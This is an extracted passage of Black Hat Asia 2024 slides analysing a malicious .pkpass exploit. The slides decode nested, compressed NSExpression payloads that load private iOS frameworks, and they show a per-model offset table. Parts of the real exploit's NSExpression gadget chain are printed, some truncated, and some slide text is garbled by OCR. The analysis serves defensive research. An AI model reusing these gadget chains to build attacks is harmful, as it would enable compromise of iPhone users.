AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

**Object Ref: 254**

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *…*

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

**Object Ref: 259**

-> Array: (260, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11)

**4**

# BHASIA   @BlackHatEvents

## Slide 76

##### **Mentioning of Payload 11**

8
11 0
259 242

# BHASIA   @BlackHatEvents

## Slide 77

## **Lets inspect that payload!**

# BHASIA   @BlackHatEvents

## Slide 78

1 MB of Binary Data

##### **The Payload**

Binary Stuff Whats does this do?
Binary + Strings Whats does this do?
NSExpression Whats does this do?
Binary + Strings Whats does this do?
\x00 *…* \x00 Whats does this do?

Binary Stuff
Binary + Strings
NSExpression
Binary + Strings
\x00 *…* \x00

# BHASIA   @BlackHatEvents

## Slide 79

1 MB of Binary Data

##### **The Payload**

Binary Stuff Whats does this do?
Binary + Strings Whats does this do?
NSExpression Whats does this do?
Binary + Strings Whats does this do?
\x00 *…* \x00 Whats does this do?
Binary Stuff
Binary + Strings
NSExpression
Binary + Strings
\x00 *…* \x00

# BHASIA   @BlackHatEvents

## Slide 80

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
ASIA 2024
¢.pkpass Ler da
Uncovering
raped
```

## Slide 81

## **Whats an NSExpression?**

# BHASIA   @BlackHatEvents

## Slide 82

###### **FUNCTION(Receiver, SelectorName, Arguments,..)**

https://developer.apple.com/documentation/foundation/nsexpression

# BHASIA   @BlackHatEvents

## Slide 83

###### **FUNCTION(@"/Developer/Tools/otest", @"lastPathComponent")**

https://developer.apple.com/documentation/foundation/nsexpression

# BHASIA   @BlackHatEvents

## Slide 84

##### **NS Expression Links**

Code Colorist

See No Eval: Runtime Dynamic Code Execution in Objective-C https://codecolor.ist/2021/01/16/see-no-eval-runtime-code-execution-objc/ Google Project 0 (Ian Beer & Samuel Groß)

FORCEDENTRY: Sandbox Escape https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html

Austin Emmet

BlackHat USA 2023 - Apple’s Predicament: NSPredicate Exploits on iOS and macOS https://www.youtube.com/watch?v=jZj8EEBp8xE

Ian Beer

OBTSv6 - Escaping the Safari Sandbox in iOS 16 https://objectivebythesea.org/v6/talks.html#Speaker_12

# BHASIA   @BlackHatEvents

## Slide 85

🤯

## **Why is this still possible?**

# BHASIA   @BlackHatEvents

## Slide 86

##### **Structure of the NSExpression Payload**

**{FUNCTION( FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', FUNCTION({ PAYLOAD-CS },’componentsJoinedByString:','').aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64DecodedString, 'cs') FUNCTION( FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', FUNCTION({ PAYLOAD-C }, 'componentsJoinedByString:', '').aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64DecodedString, 'c') FUNCTION( FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', FUNCTION({ PAYLOAD-X ).aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64DecodedString, 'x') FUNCTION( FUNCTION( FUNCTION( CAST('NSKeyPathExpression','Class'),'superclass' ),'expressionWithFormat:', FUNCTION( CAST('NSString','Class'),'stringWithUTF8String:', FUNCTION( FUNCTION( FUNCTION( FUNCTION( CAST('NSData','Class'),'alloc' ),'initWithBase64Encoding:', FUNCTION({PAYLOAD},'componentsJoinedByString:','') ),'decompressedDataUsingAlgorithm:error:', FUNCTION(3,'intValue'),nil ),'bytes' ) ),nil ),'expressionValueWithObject:context:',16045690984833335023,nil )**

**Payload-CS 1 2**

**Payload-C 1.. ..3 Payload-X 1.. ..41 Payload 1.. ..5**

**} == 1**

# BHASIA   @BlackHatEvents

## Slide 87

**Structure of the NSExpression Payload Payload-CS 1 {FUNCTION(** First executed Payload **FUNCTION( FUNCTION( 2 CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', FUNCTION({ PAYLOAD-CS },’componentsJoinedByString:','').aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64DecodedString, 'cs') FUNCTION( Payload-C FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', 1.. FUNCTION({ PAYLOAD-C }, 'componentsJoinedByString:', '').aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64DecodedString, 'c') FUNCTION( ..3 FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', Payload-X FUNCTION({ PAYLOAD-X ).aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64DecodedString, 'x') FUNCTION( FUNCTION( FUNCTION( 1.. CAST('NSKeyPathExpression','Class'),'superclass' ),'expressionWithFormat:', FUNCTION( ..41 CAST('NSString','Class'),'stringWithUTF8String:', FUNCTION( FUNCTION( FUNCTION( FUNCTION( Payload CAST('NSData','Class'),'alloc' ),'initWithBase64Encoding:', FUNCTION({PAYLOAD},'componentsJoinedByString:','') ),'decompressedDataUsingAlgorithm:error:', FUNCTION(3,'intValue'),nil 1.. ),'bytes' ) ),nil ..5 ),'expressionValueWithObject:context:',16045690984833335023,nil ) } == 1**

# BHASIA   @BlackHatEvents

## Slide 88

##### **Structure of Payload**

**FUNCTION( FUNCTION( FUNCTION( CAST('NSKeyPathExpression','Class'),'superclass' ),'expressionWithFormat:', FUNCTION( CAST('NSString','Class'),'stringWithUTF8String:', FUNCTION( FUNCTION( FUNCTION( FUNCTION( CAST('NSData','Class'),'alloc' ),'initWithBase64Encoding:', FUNCTION({ ‚7Z0Jb9tIsoDfT8kb7IM3oyDi2WwGGGB’, '*…*', '=='**

**},'componentsJoinedByString:','') ),'decompressedDataUsingAlgorithm:error:', FUNCTION(3,'intValue'),nil ),'bytes'**

**)**

**),nil ),'expressionValueWithObject:context:',16045690984833335023,nil**

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

**4**

# BHASIA   @BlackHatEvents

## Slide 89

## **Lets be naive and just try…**

# BHASIA   @BlackHatEvents

## Slide 90

##### **Lets be naive…**

**base64 -d -i payload.txt**

? o?H???O?7? ??l`tP?Mه?ݻD??H???lgl???;?<m$?M???ꪯ???? ^#?-7>\LQ4??????_r??�?]zġ.r????.?Ñ?O[(?~J>J??(?n?f[! ??Vh?PL

?0??n??[s|D2??xzF?aҢg;????n>?owRD??/Ðz??Ɂ??[?Ʊ?{I??"7???'?U???5??? k̛?:

^|?ய???;?sG

~?;???r??>r??T??8hԷ????R?2@??e??????a?BJl?W/?;?it?qDȧ?ON????n,]?ު ~_?Ñ??{^dO<Jj?7??x??????v???=Ee"????Z?| ?<??=9:????؞??E??a? Pbơ?????}??ptq?g

BE???ߋ?f??&?v??????]???NI?5Y?4"@F???~?????fG?IC????%?;_ڛ?~?m)i? E????-?K?r/????t?4Ւ?$<M|?3?xZ??7*???3?<]%a?n{WS?

# BHASIA   @BlackHatEvents

## Slide 91

## **It could have worked…**

# BHASIA   @BlackHatEvents

## Slide 92

##### **Structure of Payload**

###### **Decompression**

**Decompression FUNCTION( FUNCTION( FUNCTION( CAST('NSKeyPathExpression','Class'),'superclass' ),'expressionWithFormat:', FUNCTION( CAST('NSString','Class'),'stringWithUTF8String:', FUNCTION( FUNCTION( FUNCTION( FUNCTION( CAST('NSData','Class'),'alloc' ),'initWithBase64Encoding:', FUNCTION({ ‚7Z0Jb9tIsoDfT8kb7IM3oyDi2WwGGGB’, '*…*', '=='**

**},'componentsJoinedByString:','') ),'decompressedDataUsingAlgorithm:error:', FUNCTION(3,'intValue'),nil ),'bytes'**

**)**

**),nil ),'expressionValueWithObject:context:',16045690984833335023,nil**

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 93

## **Lets be naive part 2…**

# BHASIA   @BlackHatEvents

## Slide 94

##### **Lets be naive 2…**

###### **Output Truncated***

P

**You**

###### Please translate the following NSExpression *…* into Objective C Code.

**Chat GPT**

NSData *decodeBase64String(NSString *base64String) { return [[NSData alloc] initWithBase64EncodedString:base64String options:0]; }

NSData *decompressData(NSData *inputData) { return [[NSData  alloc] initWithData: [inputData decompressedDataUsingAlgorithm:3 error:&error]]; }

int main(int argc, const char * argv[]) {

NSArray *functionArgs = @[@"‚7Z0Jb9tIsoDfT8kb7IM3oyDi2WwGGGB", @"*…*", @"=="]; NSString *functionArgString = [functionArgs componentsJoinedByString:@""];

NSData *base64Data = decodeBase64String(functionArgString);

NSData *decompressedData = decompressData(base64Data);

NSString *decompressedString = [[NSString alloc] initWithData:decompressedData encoding:NSUTF8StringEncoding]; NSLog(@"Decompressed String: %@", decompressedString);

} }

**Payload**

**Payload-X**

**Payload-C**

**Payload-CS**

# BHASIA   @BlackHatEvents

## Slide 95

## **Its not perfect, but does it work..?**

# BHASIA   @BlackHatEvents

## Slide 96

😎

😎

😎

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
#BHASIA @BlackHatEvents
```

## Slide 97

##### **Lets be naive 2…**

###### **NSLog(@"Decompressed String: %@", decompressedString);**

{FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('NSBundle','Class'),'bundleWithPath:','/System/Library/ PrivateFrameworks/

OfficeImport.framework'),'loadAndReturnError:',nil)),FUNCTION(0,'hash',FUNCTION(FUNCTION(FUNCTION(CAST('NST hread','Class'),'currentThread'),'threadDictionary'),'setObject:forKey:',FUNCTION(FUNCTION(CAST('NSThread','Class'),'c urrentThread'),'threadDictionary'),'kOCMapper')),FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),' mapperForCurrentThread'),'setObject:forKey:',FUNCTION(CAST('NSValue','Class'),'valueWithPointer:',nil),'a504ef6e0aae bb53')),FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread'),'setObject:for Key:',FUNCTION(CAST('_NSPredicateUtilities','Class'),'add:to:',24,FUNCTION(CAST('NSNumber','Class'),'numberWithU nsignedLongLong:',FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread')

['a504ef6e0aaebb53'])),'ad45f1d2b88c756f')),FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'ma pperForCurrentThread'),'setObject:forKey:',FUNCTION(FUNCTION(CAST('NSData','Class'),'alloc'),'initWithBase64Encod edString:options:',FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread') ['cs'],FUNCTION(1,'intValue')),'af08e28ada9592c7')),FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Cla ss'),'mapperForCurrentThread'),'setObject:forKey:',

*…*

FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread')['a0ee0d7fb9123e55'],'pointerValue')))}))}

**Payload-CS**

**Payload-C**

**Payload Payload-X**

**4**

# BHASIA   @BlackHatEvents

## Slide 98

## **Time for some more Python Magic…**

**4**

# BHASIA   @BlackHatEvents

## Slide 99

##### **Formatted Payload**

###### **cat  payload_formatted.txt | less**

{ Function(0,'hash', Function([NSBundle.Class bundleWithPath:'/System/Library/PrivateFrameworks/ OfficeImport.framework'],'loadAndReturnError:',nil ) ), Function(0,'hash', Function(

Function([NSThread.Class currentThread],'threadDictionary') ,'setObject:forKey:', Function([NSThread.Class currentThread],'threadDictionary') ,'kOCMapper') ), Function(0,'hash',

Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:',[NSValue.Class valueWithPointer:nil],'a504ef6e0aaebb53') ), *…*

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 100

## **2539 Lines of Formatted NSExpression**

# BHASIA   @BlackHatEvents

## Slide 101

## **This is going to be fun…**

# BHASIA   @BlackHatEvents

## Slide 102

## **Lets take a look**

# BHASIA   @BlackHatEvents

## Slide 103

##### **Formatted Payload**

Load Framework for additional Functions

**Lines 1 - 18**

{ Function(0,'hash', Function([NSBundle.Class bundleWithPath:'/System/Library/PrivateFrameworks/ OfficeImport.framework'],'loadAndReturnError:',nil ) ), Function(0,'hash', Function( Function([NSThread.Class currentThread],'threadDictionary') ,'setObject:forKey:', Function([NSThread.Class currentThread],'threadDictionary') ,'kOCMapper') ), Function(0,'hash', Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:',[NSValue.Class valueWithPointer:nil],'a504ef6e0aaebb53') ),

SetUp Short Term Storage

Store Value at Key: a504ef6e0aaebb53

**Payload**

**Payload-X**

**Payload-C**

**Payload-CS**

# BHASIA   @BlackHatEvents

## Slide 104

##### **Formatted Payload**

**Lines 19 - 39**

Used for Calculations
Previous „Variable“

Function(0,'hash',
    Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:',
        Function(_NSPredicateUtilities.Class,'add:to:',24,
            Function(NSNumber.Class,'numberWithUnsignedLongLong:',[OCMapper.Class mapperForCurrentThread]
['a504ef6e0aaebb53']
            )
        ),
        'ad45f1d2b88c756f') Decoding Payload-CS
    ),
Function(0,'hash',
    Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:',
        Function([NSData.Class alloc],'initWithBase64EncodedString:options:',[OCMapper.Class mapperForCurrentThread]
['cs'],[1 intValue]),
                            ‚af08e28ada9592c7') Key for Decoded Payload-CS
    ),

**Payload Payload-X Payload-C**

**Payload-CS**

**4**

# BHASIA   @BlackHatEvents

## Slide 105

##### **Formatted Payload**

PLIST! Decoded Payload-CS!

**Lines 40 - 53** Decoded Payload-CS! Function(0,'hash', Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:', Function(NSPropertyListSerialization.Class,'propertyListWithData:options:format:error:',[OCMapper.Class mapperForCurrentThread]['a20973127d08fddb'],nil,nil,nil), 'a569ff75b2c20646') PLIST - Payload-CS! ), More Frameworks… Function(0,'hash', Function([NSBundle.Class bundleWithPath:'/System/Library/PrivateFrameworks/ AuthKit.framework'],'loadAndReturnError:',nil ) Get iPhone Model ),

Function(0,'hash', Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:',[AKDevice.Class _hardwareModel],'aef8a5171d6aa2d7') ),

**Payload**

**Payload-X Payload-C**

**Payload-CS**

**4**

# BHASIA   @BlackHatEvents

## Slide 106

## **So PAYLOAD-CS is a PLIST. Interesting…**

# BHASIA   @BlackHatEvents

## Slide 107

## **Lets decode it!**

# BHASIA   @BlackHatEvents

## Slide 108

##### **Decoding Payload-CS**

###### **NSLog(@"Decompressed String: %@", decompressedPayloadCSString);**

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 109

😟

# BHASIA   @BlackHatEvents

## Slide 110

## **We forgot something…**

# BHASIA   @BlackHatEvents

## Slide 111

🙈

# BHASIA   @BlackHatEvents

## Slide 112

##### **Structure of Payload-CS**

FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', FUNCTION({ eJwtlTWy7UASRBckQ0ymmPGKPTEza/ Xz5s8YJ7oio63MjKou8fWCjUQpr8CeRC/8wxol1qgg1hvy/

M7Lyyk2GlV3b1JlnId5kxQ27msxE1aF07gO1uagD9h0emvODEJomOGjV7x0EB0OCo8MuUQ W/mkKoxcjfdO5Z3042k2TMaDFmE0meIEVDUS/5xi/pSG9X/ ZtR83VjaJwHKcIhqYoyhxjfV23rvcTOJFtaiWQtrXWoMVtRmx+oGnuGgyTPNTlSNRlUdTlQfjhel JM3Zbh6k8g0k5QpF9dUxrDOUeCq6wsOknHKUkrKUnHGiTzUz5udFvTcFs9d1t7/

*…*

fpcKX6ZbblCgf8BmrecD56HVDpqCbFw5AIaGqu3gXUWcDlf0eHX/Bv/ LscRpI2v61w1sJf+XxB3lAch00U0sFBNXUNkjQIEM2l1uldKs2ogp1b16tw2HWVrGC9gnAKCW uw6HBA9m1goxVDV3YKPWR9ziArt4yYrtUFtoZ2vLD/az66bGKxONnf/Qq6ozqhXzb/ UCc7khN+SEc+BCTN4VSjF0D9RUdFDUIpk+l2Ufx/

AEMAIrI= },’componentsJoinedByString:','').aaf_toBase64DecodedData._CUTDecompressDat a.base64Encoding.aaf_toBase64DecodedString, 'cs')

**Payload-CS**

**Payload-C**

**Payload Payload-X**

**4**

# BHASIA   @BlackHatEvents

## Slide 113

## **Whats aaf_toBase64DecodedData?**

**4**

# BHASIA   @BlackHatEvents

## Slide 114

###### P

**You** “aff_toBase64DecodedData”

**Google** Your search - “aff_toBase64DecodedData” - did not match any documents. Suggestions:

- Make sure that all words are spelled correctly.

- Try different keywords.

- Try more general keywords.

# BHASIA   @BlackHatEvents

## Slide 115

🙈

# BHASIA   @BlackHatEvents

## Slide 116

## **Maybe there is more luck with CUTDecompressData?**

# BHASIA   @BlackHatEvents

## Slide 117

P **You** “CUTDecompressData”

**Google**

It looks like there aren't many great matches for your search

Try using words that might appear on the page that you’re looking for. For example, 'cake recipes' instead of 'how to make a cake’.

Need help? Take a look at other tips for searching on Google.

GitHub https://github.com > master > CoreFoundation.framework

NSData.h

... **CUTDecompressData** ; - (id)_CUTOptionallyDecompressData;(id)_CUTStringFromBaseData; // Image:…

# BHASIA   @BlackHatEvents

## Slide 118

😎

# BHASIA   @BlackHatEvents

## Slide 119

## **Lets search on GitHub for aaf_toBase64DecodedData?**

# BHASIA   @BlackHatEvents

## Slide 120

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
= © Q aaf_toBase64DecodedData
Filter by 21 files (395 ms)
Code Vv 2 lechium/iPhone_OS_17.0_21A328 - System/Library/PrivateFrameworks/AAAFoundation/NSString-AAAFoundation.h
R itori:
€positories 13 (id) aaf_base64Padded; // IMP=0x0010000000001e02
Issues 14 (id) aaf_toBase64EncodedSt ring; // IMP=0x0010000000001da9
15 (id) aaf_toBase64DecodedString; // IMP=0x0010000000001d4d
Pull requests 16 (id) aaf_toBase64DecodedData; // IMP=0x0010000000001ce2
17 (id) aaf_urlEncoded; // IMP=0x@010000000001c7c
18 @end
Users 19
Discussions
Commits
Packages Y @ MTACS/i0S-17-Runtime-Headers - Frameworks/Foundation.framework/NSString.h
Wikis 853 + (id)URLQueryValueALlowedCharacterSet;
Topics
(id) aaf_base64Padded;
Marketplace (id) aaf_toBase64DecodedData;
(id) aaf_toBase64DecodedSt ring;
(id) aaf_toBase64EncodedSt ring;
(id) aaf_toSHA256Data;
Languages
Objective-C
@ Text
Vv @ hack-different/symbol-server - symbols/macOS/a8f403688d333b121b8f3d67dbfeb344_AAAFoundation
@® More languages...
54 ..@1f2c2aff4 ( @x74) -[NSString(AAAFoundation) aaf_toBase64DecodedData] [FUNC, OBJC, NameNList, MangledNameNList, Mer..
Repositories 757 @x00000001f2c40320 ( @x20) objc_msgSend$aaf_toBase64DecodedData [FUNC, PEXT, NameNList, MangledNameNList, NLis..
```

## Slide 121

😎

😎

# BHASIA   @BlackHatEvents

## Slide 122

## **So lets „import“ those Frameworks and lets try again…**

# BHASIA   @BlackHatEvents

## Slide 123

##### **Decoding Payload-CS**

###### **NSLog(@"Decompressed String: %@", decompressedPayloadCSString);**

Bplist! bplist00

*…*

Q0Q1R10R11R12R13R14R15R16R17R18R19Q2R20R21R22R23R24R25R26R 27R28R29Q3R30R31R32R33R34R35R36R37Q4Q5Q6Q7Q8Q9_iPhone10,1:20 E247_iPhone10,1:20E252_iPhone10,1:20F66_iPhone10,1:20F75_iPhone10,1:2 0F770750d_iPhone10,1:20G75_iPhone10,2:20E247_iPhone10,2:20E252_iPhon e10,2:20F66_iPhone10,2:20F75_iPhone10,2:20F770750d_iPhone10,2:20G75_i Phone10,3:20E247_iPhone10,3:20E252_iPhone10,3:20F66_iPhone10,3:20F75_ iPhone10,3:20F770750d_iPhone10,3:20G75_iPhone10,4:20E247_iPhone10,4:2 0E252_iPhone10,4:20F66_iPhone10,4:20F75_iPhone10,4:20F770750d_iPhone 10,4:20G75_iPhone10,5:20E247_iPhone

*…*

**Payload**

**Payload-X**

**Payload-C**

**Payload-CS**

# BHASIA   @BlackHatEvents

## Slide 124

😎

😎

😎

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
#BHASIA @BlackHatEvents
```

## Slide 125

## **Lets have a look at the PLIST file…**

# BHASIA   @BlackHatEvents

## Slide 126

##### **Decoding Payload-CS**

###### **NSLog(@"Decompressed String: %@", decompressedPayloadCSPlist);**

{ "28" : { "s10.3" : -149170296, "s9.7.7" : -15977552, "s10.2" : -896240284, "s9.7.8" : -15977544 }, "iPhone10,4:20F75" : "10", "iPhone10,4:20F770750d" : "10", "29" : { "s10.3" : -125850544, "s9.7.7" : 80343472, "s10.2" : -912122464, "s9.7.8" : 80343480 }, "iPhone10,6:20E247" : "27", *…*

iPhone Model + Build No iPads…!

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 127

😎

😎

😎

😎

😎

😎

# BHASIA   @BlackHatEvents

## Slide 128

## **Two done! Two to go!**

# BHASIA   @BlackHatEvents

## Slide 129

##### **Mentioning of Payload-C**

**Lines 99 - 115**

Payload-C!

Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:', Function([NSData.Class alloc],'initWithBase64EncodedString:options:',[OCMapper.Class mapperForCurrentThread]. [‚c'],[1 i ~~ntValue]),~~ Another Compression Format 'a106c512d6e4353b')

Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:', Function([OCMapper.Class mapperForCurrentThread] ['a106c512d6e4353b'],'decompressedDataUsingAlgorithm:error:',[3 intValue],nil), ‚ac7fbd150d686fba')

Payload-C = Another PLIST

Function([OCMapper.Class mapperForCurrentThread],'setObject:forKey:', Function(NSPropertyListSerialization.Class,'propertyListWithData:options:format:error:',[OCMapper.Class mapperForCurrentThread]['ac7fbd150d686fba'],nil,nil,nil), 'abfd13dbf88776d2')

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 130

##### **Structure of Payload-C**

**FUNCTION( FUNCTION( CAST('NSThread', 'Class'), 'currentThread' ), 'threadDictionary' ), 'setObject:forKey:', FUNCTION({ eJwVljWS5UAQRA8kQ0ymmJnlSV/ MTKffWa+jIpqyIN+Wdup3vljxK68pQJicn6/ eQmM+hBmK9hgRVlVt7aFhzFWDec0lHks+p91pjxj07WA0wUgYGilva91S6IDS89wGKKdS 6rQykeoLJMcDBSks+SkKocx1aGkuxxBewYDgudvgi2HIjkSFhco2PVKrL46UZV1Dc3SITw ME/**

***…***

**4B+P4kRAALYY1Gl9dNvp+MAjgvxOsqiH625zHBF6B56SjeFCBl1L9A5q/bVI=}, 'componentsJoinedByString:', '').aaf_toBase64DecodedData._CUTDecompressData.base64Encoding.aaf_toBase64Dec odedString, 'c')**

**Payload-CS**

**Payload-C**

**Payload Payload-X**

# BHASIA   @BlackHatEvents

## Slide 131

##### **Decoding Payload-C**

###### **NSLog(@"Decompressed String: %@", decompressedPayloadCPlist);**

Payload!

{

"a46aac1d87209cc3" : „FUNCTION({TERNARY(FUNCTION(CAST(‚OCMapper‘,’Class'),'mapperForCurrentThread') ['ab414b48d50d82b9']==nil,FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentT hread'),'setObject:forKey:',FUNCTION(FUNCTION(CAST('NSKeyPathExpression','Class'),'superclass'),'expressionWithFo rmat:',FUNCTION(CAST('NSString','Class'),'stringWithUTF8String:',FUNCTION(FUNCTION(FUNCTION(FUNCTION(CAS T('NSData','Class'),'alloc'),'initWithBase64Encoding:',FUNCTION({'PayloadInsidePayload-

C'},'componentsJoinedByString:','')),'decompressedDataUsingAlgorithm:error:',FUNCTION(3,'intValue'),nil),'bytes')),nil),'ab 414b48d50d82b9')),1),FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread')['ab414b48d50d82b9']} [LAST],'expressionValueWithObject:context:',16045690984833335023,nil)"

}

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 132

## **Compressed Payload Inside Compressed Payload-C**

# BHASIA   @BlackHatEvents

## Slide 133

##### **Decoding Payload inside Payload-C**

**NSLog(@"Decompressed String: %@", PayloadInsidePayloadCPlist);** Another Payload

{FUNCTION(0,'hash',1),FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThrea d')

['a5749a0c51e8429b'],'performSelector:withObject:withObject:',FUNCTION(FUNCTION(CAST('NSExpression','Class'),'ex pressionForFunction:selectorName:arguments:',FUNCTION(CAST('NSExpression','Class'),'expressionForAnyKey'),'setAr gument:atIndex:',nil),'selector'),FUNCTION(FUNCTION(CAST('_NSPredicateUtilities','Class'),'add:to:',24,FUNCTION(CAS T('NSNumber','Class'),'numberWithUnsignedLongLong:',FUNCTION(CAST('NSValue','Class'),'valueWithPointer:',FUNCTI ON(18446744073709551614,'unsignedLongValue')))),'pointerValue'),nil))

*…*

FUNCTION(FUNCTION(FUNCTION(FUNCTION(CAST(‚NSData‘,’Class’),’alloc'),'initWithBase64Encoding:','3VVZr5tGGO *...*

Mo7XVCGDrEMJ8lPdxneZ75p0I+jt9go59+Aw=='),'decompressedDataUsingAlgorithm:error:',FUNCTION(3,'intValue'),nil),' bytes')),nil),'a776c8627453a6b9')),1),FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread') ['a776c8627453a6b9']}

[LAST],'a65f00c73b1c7996')),FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrent Thread')

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 134

**Compressed Payload Inside Compressed Payload Inside Compressed Payload-C**

# BHASIA   @BlackHatEvents

## Slide 135

##### **Decoding Payload inside Payload inside Payload-C**

Another Payload

**NSLog(@"Decompressed String: %@", PayloadInsidePayloadInsidePayloadCPlist);**

TERNARY(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread') ['a5469019921478ef']>FUNCTION(CAST('_NSPredicateUtilities','Class'),'from:subtract:',FUNCTION(CAST('OCMapper','C lass'),'mapperForCurrentThread')

*…*

FUNCTION(CAST(‚NSString‘,’Class’),’stringWithUTF8String:',FUNCTION(FUNCTION(FUNCTION(FUNCTION(CAST('NS Data','Class'),'alloc'),'initWithBase64Encoding:','zVdNb9pAEO1P4ZQNkg/

*...*

7wGw=='),'decompressedDataUsingAlgorithm:error:',FUNCTION(3,'intValue'),nil),'bytes')),nil),'acd9421026604f20')

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 136

**Compressed Payload Inside Compressed Payload Inside Compressed Payload Inside Compressed Payload-C**

# BHASIA   @BlackHatEvents

## Slide 137

##### **Decoding Payload inside Payload inside Payload inside Payload-C**

**NSLog(@"Decompressed String: %@", PayloadInsidePayloadInsidePayloadInsidePayloadCPlist);**

TERNARY(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread') ['a02bb2d41a4a6c3a']<48&&FUNCTION(CAST('OCMapper','Class'),'mapperFor CurrentThread')['ab2b4adedcace459']==nil,

*…*

['a02bb2d41a4a6c3a']),'a02bb2d41a4a6c3a')),FUNCTION(0,'hash',FUNCTION(F UNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread'),'setObject:forK ey:',FUNCTION(CAST('_NSPredicateUtilities','Class'),'from:subtract:',FUNCTION ({})),FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThrea d')['a2fcc0e6725476c2'],'expressionValueWithObject:context:',nil,nil)}, 0)

**Payload Payload-X Payload-C Payload-CS**

# BHASIA   @BlackHatEvents

## Slide 138

## **Finally no more payloads!**

# BHASIA   @BlackHatEvents

## Slide 139

## **Three down. One to go.**

# BHASIA   @BlackHatEvents

## Slide 140

## **No mention of „x“ in Payload, Payload-C**

# BHASIA   @BlackHatEvents

## Slide 141

##### **Formatted Payload**

**Lines 2487 - 2497** Function([NSKeyPathExpression.Class superclass],'expressionWithFormat:', Function(NSString.Class,'stringWithUTF8String:', Function( Function( Function([NSData.Class alloc],'initWithBase64Encoding:', [{'7V1bT+NIFtWLFoFVxCAAABYHEne9Xi2vboxN0U2cbqjFidEasz+l6d8aw7do9fCHDFSB8grZElUBHFDFbTSralxq21CUB BoBj2mEuksZiWVzepmwvCAVv/ *..* +As=‚}‘componentsJoinedByString:’, '']), 'decompressedDataUsingAlgorithm:error:',[3 intValue],nil), 'bytes') ), nil), 'ab99f0dd78089b31') ),

Another Payload

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 142

## 😣 **More payloads**

# BHASIA   @BlackHatEvents

## Slide 143

##### **Compressed Payload inside Payload**

**NSLog(@"Decompressed String: %@", payloadInsidePayload);**

Payload-X!

